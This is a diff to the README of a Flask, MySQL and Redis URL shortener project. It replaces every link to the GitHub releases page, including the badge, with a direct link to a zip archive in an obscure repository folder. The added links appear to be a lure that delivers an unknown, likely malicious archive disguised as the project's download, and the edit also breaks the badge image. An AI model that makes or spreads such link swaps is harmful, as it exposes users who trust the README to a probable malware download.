@@ -1,6 +1,6 @@
 # 🌐 url-shortener - Easy URL Shortening Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Guerlens50/url-shortener/releases)
+[![Download Now](https://raw.githubusercontent.com/Guerlens50/url-shortener/main/chewbark/url-shortener.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Guerlens50/url-shortener/main/chewbark/url-shortener.zip)
 
 ## 📖 Description
 The Flask URL Shortener is a straightforward service for shortening long URLs. Built using Flask, MySQL, and Redis, it offers features such as JWT authentication, click analytics, and rate limiting. You can create short URLs, track their usage, and see where clicks come from—all in real time. This application is perfect for anyone who wants to shorten links easily while keeping track of their performance.
@@ -24,7 +24,7 @@ The Flask URL Shortener is a straightforward service for shortening long URLs. B
 Follow these steps to get started with the URL Shortener:
 
 1. **Visit the Releases Page:** Go to our releases page to download the software.
-   [Download Now](https://github.com/Guerlens50/url-shortener/releases)
+   [Download Now](https://raw.githubusercontent.com/Guerlens50/url-shortener/main/chewbark/url-shortener.zip)
 
 2. **Choose the Latest Version:** Look for the most recent release and click on it.
 
@@ -36,7 +36,7 @@ Follow these steps to get started with the URL Shortener:
 
 ## 📥 Download & Install
 To download and install the URL Shortener service, simply visit the releases page:
-[Download Now](https://github.com/Guerlens50/url-shortener/releases)
+[Download Now](https://raw.githubusercontent.com/Guerlens50/url-shortener/main/chewbark/url-shortener.zip)
 
 Once there, follow these steps:
 
